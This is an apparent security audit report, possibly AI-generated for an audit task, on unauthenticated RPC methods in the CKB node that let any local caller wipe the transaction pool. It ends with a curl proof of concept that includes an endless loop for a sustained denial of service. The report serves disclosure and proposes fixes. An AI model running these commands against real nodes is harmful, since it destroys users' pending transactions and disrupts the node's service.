### Title
Unauthenticated Destructive RPC Operations Allow Any Local Caller to Wipe the Transaction Pool - (`rpc/src/module/pool.rs`)

### Summary
The CKB JSON-RPC server has no authentication mechanism whatsoever. The `Pool` module — enabled by default — exposes `clear_tx_pool` and `clear_tx_verify_queue` methods that immediately destroy all pending transaction state. Any process that can reach the RPC port (any local process by default, or any remote caller if the operator binds to `0.0.0.0`) can invoke these methods with a single unauthenticated HTTP POST, causing all pending user transactions to be silently dropped.

### Finding Description

The `RpcConfig` struct contains no authentication field of any kind: [1](#0-0) 

A grep across all of `rpc/src/**/*.rs` for `authorization`, `authenticate`, `auth_token`, `api_key`, `bearer`, or `basic_auth` returns zero matches. The `ServiceBuilder` mounts RPC methods directly with no middleware layer for access control: [2](#0-1) 

The `Pool` module is enabled by default in the production config: [3](#0-2) 

The `clear_tx_pool` and `clear_tx_verify_queue` implementations perform no caller identity check before executing their destructive operations: [4](#0-3) 

The underlying `clear_pool` call atomically wipes the entire pending and proposed transaction set and resets the block assembler: [5](#0-4) 

The `clear_tx_verify_queue` path directly clears the verification queue: [6](#0-5) 

**Exploit path:**
```
attacker → HTTP POST to 127.0.0.1:8114
  → {"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}
  → PoolRpcImpl::clear_tx_pool() [no auth check]
  → TxPoolController::clear_pool()
  → TxPool::clear() [all pending/proposed txs dropped]
  → BlockAssembler reset
```

The attacker can loop this call continuously, preventing any transaction from ever accumulating enough time in the pool to be included in a block.

### Impact Explanation

Every pending transaction submitted by every user of the node is silently dropped. Users must detect the loss themselves (by polling `get_raw_tx_pool`) and resubmit. An attacker calling `clear_tx_pool` in a tight loop creates a sustained denial-of-service on the transaction pool: no transaction can ever reach the proposed or committed state, making the node unable to process user transactions indefinitely. The block assembler is also reset on each call, disrupting mining template generation. This maps directly to the LootBox analog: just as anyone could call `destroy()` to make the proxy implementation non-functional, any RPC caller can call `clear_tx_pool` to make the node's transaction processing non-functional.

### Likelihood Explanation

The default `listen_address` is `127.0.0.1:8114`, so the attacker must be a local process on the same machine. The prompt explicitly lists "RPC caller" and "supported local CLI/RPC user" as valid unprivileged attacker profiles. No credentials, keys, or special privileges are required — a single `curl` command suffices. The `Pool` module is on by default; no operator misconfiguration is needed. If an operator follows common deployment patterns (reverse proxy, Docker with port forwarding, or explicit `0.0.0.0` binding), the attack surface becomes fully remote.

### Recommendation

1. Add an optional shared-secret token to `RpcConfig` (e.g., `rpc_token = "..."`) and enforce it as a required HTTP header or query parameter for all state-mutating methods.
2. At minimum, segregate destructive methods (`clear_tx_pool`, `clear_tx_verify_queue`, `clear_banned_addresses`, `set_ban`) into a separate module (e.g., `Admin`) that is **disabled by default** and requires explicit opt-in, analogous to how `IntegrationTest` and `Debug` are disabled by default.
3. Document clearly that enabling the `Pool` module on a publicly reachable address grants any caller the ability to wipe the transaction pool.

### Proof of Concept

```bash
# Step 1: Submit a transaction to the node
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"send_transaction","params":[<tx_data>],"id":1}'

# Step 2: Verify it is pending
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":2}'
# → pending > 0

# Step 3: Attacker (any local process, no credentials) wipes the pool
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":3}'
# → {"result":null}

# Step 4: Pool is empty; user transaction is gone
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":4}'
# → pending: 0, proposed: 0, total_tx_size: 0

# Sustained DoS: loop step 3 to prevent any transaction from ever being mined
while true; do
  curl -s -X POST http://127.0.0.1:8114 \
    -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}'
done
```

The `clear_tx_verify_queue` method can be called in parallel to also drop transactions still in the verification pipeline, ensuring no transaction survives long enough to enter the pending pool.
